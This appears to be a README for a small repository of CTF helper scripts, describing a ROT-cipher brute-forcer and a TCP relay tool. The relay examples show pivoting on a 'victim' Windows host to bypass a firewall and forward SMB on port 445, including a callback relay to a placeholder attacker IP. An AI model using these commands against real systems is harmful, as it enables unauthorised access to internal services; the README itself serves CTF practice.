# python_widgets
A collection of small helper scripts I've used during CTF challenges; all scripts are made with the quick-and-dirty principle, but that doesn't mean they're not useful!

All scripts written for Python 3. More to follow in time.

## Requirements

All requirements have been rolled into one requirements file, to get up and running for all tools:

```
~$ python -m pip install -r requirements.txt
```

Then go!

## rot_hunter

This is the first tool I've published so far and is somehting I use when feeling too lazy to try different rot encodings during CTFs. This tool takes two files as command line arguments, one containing your ciphertext, one containing a dictinary of valid words; the tool will find the most likely rot key and allow you to parse all other options in decreasing order of confidence the solution is good.

I've inluded a couple of test files for your enjoyment; check out the file header or usage info and get started!

## TCP Relay

This tool is a (slightly) simpler version of a netcat relay, without netcat, trickery, magic etc. Just drop the relay on your target and start forwarding TCP ports. 

You should compile your own binary for your systems if you can, but a copy is included in the repo for speediness.

### Examples

To forward a firewalled port (say 445 in this example), over a permitted port (5555), run:

```
C:\> relay.exe -c 127.0.0.1 445 -l 5555
```

And you'll be able to connect straight up to the victim port 5555 to get SMB access; similarly, if all inbound is filetered, you could run a call back relay. On your attacker:

```
attacker@attacker ~$ relay.py -l 4444 -l 9999 -v -t
```

This will set up a loacl relay to catch the callback and serve relay traffic to port 9999; the v and t tags make the tool vun verbosely and tee all data to the console respectively. Now execute a callback relay from the victim:

``` 
C:\relay.exe -c 127.0.0.1 445 -c <attacker_IP> 4444
```

Now you'll be able to access SMB from your **attacker** machine, port 9999. Enjoy!
